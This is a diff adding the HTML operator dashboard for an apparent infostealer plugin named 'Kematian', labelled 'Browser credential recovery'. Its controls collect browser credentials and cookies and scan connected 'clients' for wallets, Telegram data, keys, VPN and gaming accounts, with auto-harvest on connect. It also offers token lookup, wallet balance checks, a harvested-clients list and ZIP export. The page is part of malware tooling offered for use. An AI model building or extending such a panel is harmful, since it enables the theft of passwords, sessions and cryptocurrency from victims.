@@ -1,0 +1,212 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Kematian</title>
+    <link rel="stylesheet" href="/vendor/inter/400.css" />
+    <link rel="stylesheet" href="/vendor/inter/600.css" />
+    <link rel="stylesheet" href="/vendor/inter/700.css" />
+    <link rel="stylesheet" href="/plugins/kematian/assets/kematian.css" />
+  </head>
+  <body>
+    <main class="container">
+      <header class="header">
+        <h1>Kematian</h1>
+        <p class="sub" id="sub-title">Browser credential recovery</p>
+      </header>
+
+      <!-- Per-client controls -->
+      <section class="card" id="client-card">
+        <div class="row">
+          <label class="label">Client ID</label>
+          <input id="client-id" class="input" readonly />
+        </div>
+        <div class="status-row">
+          <span id="status-dot" class="dot dot-off"></span>
+          <span id="status-text">Not connected</span>
+        </div>
+        <div class="actions">
+          <button id="collect-btn" class="btn btn-green">Collect</button>
+          <button id="scan-files-btn" class="btn">Scan Files</button>
+          <button id="scan-ext-btn" class="btn">Scan Extensions</button>
+          <button id="scan-wallets-btn" class="btn">Scan Wallets</button>
+          <button id="scan-tg-btn" class="btn">Scan Telegram</button>
+          <button id="scan-keys-btn" class="btn">Scan Keys</button>
+          <button id="scan-apps-btn" class="btn">Scan Apps</button>
+          <button id="scan-gaming-btn" class="btn">Scan Gaming</button>
+          <button id="scan-vpn-btn" class="btn">Scan VPN</button>
+          <button id="ping-btn" class="btn">Ping</button>
+          <button id="export-btn" class="btn" disabled>Export ZIP</button>
+        </div>
+      </section>
+
+      <!-- Global controls (hidden until global mode) -->
+      <section class="card" id="global-card" style="display:none">
+        <div id="global-stats" class="global-stats"></div>
+        <div class="actions">
+          <button id="refresh-btn" class="btn">Refresh</button>
+          <button id="export-all-btn" class="btn" disabled>Export All ZIP</button>
+          <button id="clear-all-btn" class="btn btn-danger">Clear All</button>
+        </div>
+      </section>
+
+      <!-- Multi-client summary dashboard -->
+      <section class="card" id="summary-card" style="display:none">
+        <div class="summary-header">
+          <h2>Summary</h2>
+          <div class="summary-totals" id="summary-totals"></div>
+        </div>
+        <div id="summary-grid" class="summary-grid"></div>
+      </section>
+
+      <!-- Settings (global mode, admin only) -->
+      <section class="card" id="settings-card" style="display:none">
+        <h2>Settings</h2>
+        <div id="settings-admin-msg" class="settings-notice" style="display:none">
+          Only server admins can modify auto-harvest settings.
+        </div>
+        <div class="settings-grid" id="settings-grid">
+          <div class="setting-row">
+            <div class="setting-info">
+              <span class="setting-name">Auto-harvest on connect</span>
+              <span class="setting-desc">Automatically collect browser data when a new client connects</span>
+            </div>
+            <label class="toggle-label">
+              <input type="checkbox" id="auto-harvest-toggle" />
+              <span class="toggle-track"><span class="toggle-thumb"></span></span>
+            </label>
+          </div>
+          <div class="setting-row setting-sub" id="ah-files-row">
+            <div class="setting-info">
+              <span class="setting-name">Include file scan</span>
+              <span class="setting-desc">Scan for sensitive files (documents, keys, seed phrases)</span>
+            </div>
+            <label class="toggle-label">
+              <input type="checkbox" id="auto-files-toggle" disabled />
+              <span class="toggle-track"><span class="toggle-thumb"></span></span>
+            </label>
+          </div>
+          <div class="setting-row setting-sub" id="ah-ext-row">
+            <div class="setting-info">
+              <span class="setting-name">Include extension scan</span>
+              <span class="setting-desc">Scan for installed browser extensions</span>
+            </div>
+            <label class="toggle-label">
+              <input type="checkbox" id="auto-ext-toggle" disabled />
+              <span class="toggle-track"><span class="toggle-thumb"></span></span>
+            </label>
+          </div>
+          <div style="height:1px;background:var(--border);margin:10px 0"></div>
+          <div class="setting-row">
+            <div class="setting-info">
+              <span class="setting-name">Capture browser history</span>
+              <span class="setting-desc">Store browsing history from harvested clients</span>
+            </div>
+            <label class="toggle-label">
+              <input type="checkbox" id="capture-history-toggle" checked />
+              <span class="toggle-track"><span class="toggle-thumb"></span></span>
+            </label>
+          </div>
+          <div class="setting-row">
+            <div class="setting-info">
+              <span class="setting-name">Capture cookies</span>
+              <span class="setting-desc">Store browser cookies from harvested clients</span>
+            </div>
+            <label class="toggle-label">
+              <input type="checkbox" id="capture-cookies-toggle" checked />
+              <span class="toggle-track"><span class="toggle-thumb"></span></span>
+            </label>
+          </div>
+          <div class="setting-row">
+            <div class="setting-info">
+              <span class="setting-name">History limit per client</span>
+              <span class="setting-desc">Max history rows kept per client (0 = unlimited). Excess purged on startup.</span>
+            </div>
+            <input type="number" id="history-limit-input" class="input" style="width:90px;flex:none" min="0" value="5000" />
+          </div>
+          <div class="setting-row">
+            <div class="setting-info">
+              <span class="setting-name">Cookie max age (days)</span>
+              <span class="setting-desc">Delete cookies older than this many days (0 = keep all). Purged on startup.</span>
+            </div>
+            <input type="number" id="cookie-age-input" class="input" style="width:90px;flex:none" min="0" value="30" />
+          </div>
+          <div class="setting-row">
+            <div class="setting-info">
+              <span class="setting-name">Manual purge</span>
+              <span class="setting-desc">Permanently delete all history or cookies across all clients</span>
+            </div>
+            <div class="actions">
+              <button id="purge-history-btn" class="btn btn-danger-sm">Purge All History</button>
+              <button id="purge-cookies-btn" class="btn btn-danger-sm">Purge All Cookies</button>
+            </div>
+          </div>
+        </div>
+        <span id="settings-status" class="settings-status"></span>
+      </section>
+
+      <!-- Harvested clients overview (hidden until global mode) -->
+      <section class="card" id="clients-card" style="display:none">
+        <h2>Harvested Clients</h2>
+        <div id="clients-list" class="clients-list"></div>
+      </section>
+
+      <!-- Data table (shared between modes) -->
+      <section class="card" id="data-card" style="display:none">
+        <div id="collect-errors" class="collect-errors" style="display:none"></div>
+        <div class="data-top">
+          <div id="tabs" class="tabs"></div>
+          <div class="data-controls">
+            <input id="search" class="input search-input" placeholder="Search all data…" />
+            <div id="bfilts" class="bfilts"></div>
+          </div>
+          <div id="cfilts" class="cfilts" style="display:none"></div>
+        </div>
+        <div id="discord-view" style="display:none">
+          <div class="dp-toolbar">
+            <button id="enrich-all-btn" class="btn">Lookup All Tokens</button>
+            <span id="enrich-status" class="dp-enrich-status"></span>
+          </div>
+          <div id="dp-grid" class="dp-grid"></div>
+        </div>
+        <div id="wallet-view" style="display:none">
+          <div class="dp-toolbar">
+            <button id="check-balances-btn" class="btn">Check All Balances</button>
+            <span id="balance-status" class="dp-enrich-status"></span>
+          </div>
+          <div id="wl-grid" class="wl-grid"></div>
+        </div>
+        <div id="search-all-view" style="display:none">
+          <div id="search-all-grid" class="search-all-grid"></div>
+          <div id="search-all-empty" class="no-rows" style="display:none">No results found.</div>
+        </div>
+        <div class="table-wrap">
+          <table class="data-table">
+            <thead id="data-thead"></thead>
+            <tbody id="data-tbody"></tbody>
+          </table>
+          <div id="no-rows" class="no-rows" style="display:none">No entries match the current filter.</div>
+        </div>
+        <div class="table-foot">
+          <div id="pagination-bar" class="pagination-bar" style="display:none">
+            <button id="page-prev" class="btn" disabled>&larr; Prev</button>
+            <span id="page-info"></span>
+            <button id="page-next" class="btn">Next &rarr;</button>
+          </div>
+          <span id="row-count">0 entries</span>
+          <button id="export-tab-btn" class="btn" style="padding:4px 10px;font-size:12px">Export</button>
+          <label class="reveal-label">
+            <input type="checkbox" id="reveal-toggle" /> Show sensitive
+          </label>
+        </div>
+      </section>
+
+      <section class="card">
+        <h2>Log</h2>
+        <pre id="log" class="log"></pre>
+      </section>
+    </main>
+    <script src="/plugins/kematian/assets/kematian.js"></script>
+  </body>
+</html>
